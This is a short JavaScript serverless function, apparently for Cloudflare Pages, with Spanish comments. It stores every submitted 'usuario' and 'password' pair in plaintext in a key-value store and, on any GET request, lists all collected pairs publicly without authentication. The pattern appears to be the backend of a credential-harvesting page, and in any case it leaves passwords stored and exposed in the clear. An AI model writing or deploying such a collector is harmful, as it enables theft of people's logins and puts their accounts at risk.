export async function onRequest(context) {
  const { request, env } = context;

  if (request.method === "POST") {
    const formData = await request.formData();
    const usuario = formData.get("usuario");
    const password = formData.get("password");

    // Guardar en KV con timestamp
    const id = Date.now().toString();
    await env.DATOS.put(id, `Usuario: ${usuario}, Password: ${password}`);

    return new Response("Datos guardados correctamente");
  }

  if (request.method === "GET") {
    // Listar todos los envíos
    const list = await env.DATOS.list();
    let salida = "";
    for (const key of list.keys) {
      const valor = await env.DATOS.get(key.name);
      salida += `${key.name}: ${valor}\n`;
    }
    return new Response(salida, { headers: { "Content-Type": "text/plain" } });
  }

  return new Response("Método no soportado", { status: 405 });
}
